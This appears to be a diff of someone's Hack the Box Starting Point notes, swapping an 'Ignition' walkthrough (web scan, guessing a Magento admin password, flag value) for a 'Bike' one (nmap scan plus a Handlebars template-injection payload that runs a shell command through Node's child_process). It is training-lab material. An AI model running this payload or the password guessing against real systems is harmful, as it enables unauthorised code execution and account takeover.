@@ -1,53 +1,46 @@
 Hack the Box
 starting point
 
-Ignition
+Bike
 
+10.129.97.64
 
-curl -v http://10.129.1.27
-*   Trying 10.129.1.27:80...
-* Connected to 10.129.1.27 (10.129.1.27) port 80 (#0)
-> GET / HTTP/1.1
-> Host: 10.129.1.27
-> User-Agent: curl/7.81.0
-> Accept: */*
-> 
-* Mark bundle as not supporting multiuse
-< HTTP/1.1 302 Found
-< Server: nginx/1.14.2
-< Date: Mon, 26 Jun 2023 01:03:46 GMT
-< Content-Type: text/html; charset=UTF-8
-< Transfer-Encoding: chunked
-< Connection: keep-alive
-< Set-Cookie: PHPSESSID=sva9oc3atohb41fvc4gfr0pm4s; expires=Mon, 26-Jun-2023 02:03:46 GMT; Max-Age=3600; path=/; domain=10.129.1.27; HttpOnly; SameSite=Lax
-< Location: http://ignition.htb/
+┌──(kali㉿kali)-[~/…/CTF/HTB/starting_point/bike]
+└─$ nmap -sV -sC --min-rate 1000 --max-retries 2 -oN nmap/bike 10.129.97.64
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 23:57 EDT
+Nmap scan report for 10.129.97.64
+Host is up (0.082s latency).
+Not shown: 998 closed tcp ports (conn-refused)cd 
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http    Node.js (Express middleware)
+|_http-title:  Bike 
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-gobuster -u http://ignition.htb -w /usr/share/wordlists/Discovery/Web-Content/directory-list-2.3-small.txt
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds
 
-
-The default username for your Magento router is admin. 
-The default password is 123123. 
-Enter the username & password, hit "Enter" 
-
-head /usr/share/wordlists/Passwords/probable-v2-top1575.txt 
-123456
-password
-123456789
-12345678
-12345
-qwerty
-123123
-111111
-abc123
-1234567
-
-*** Try each of these with 123 appended (since the default is 123123)
-
-Username: admin
-Password: qwerty123
-
-
-Advanced Reporting
-Congratulations, your flag is: 797d6c988d9dc5865e010b9410f247e0
-Gain new insights and take command of your business' performance, using our dynamic product, order, and customer reports tailored to your customer data.
+{{#with "s" as |string|}}
+ {{#with "e"}}
+ {{#with split as |conslist|}}
+ {{this.pop}}
+ {{this.push (lookup string.sub "constructor")}}
+ {{this.pop}}
+ {{#with string.split as |codelist|}}
+ {{this.pop}}
+ {{this.push "return require('child_process').exec('whoami');"}}
+ {{this.pop}}
+ {{#each conslist}}
+ {{#with (string.sub.apply 0 codelist)}}
+ {{this}}
+ {{/with}}
+ {{/each}}
+ {{/with}}
+ {{/with}}
+ {{/with}}
+{{/with}}
 
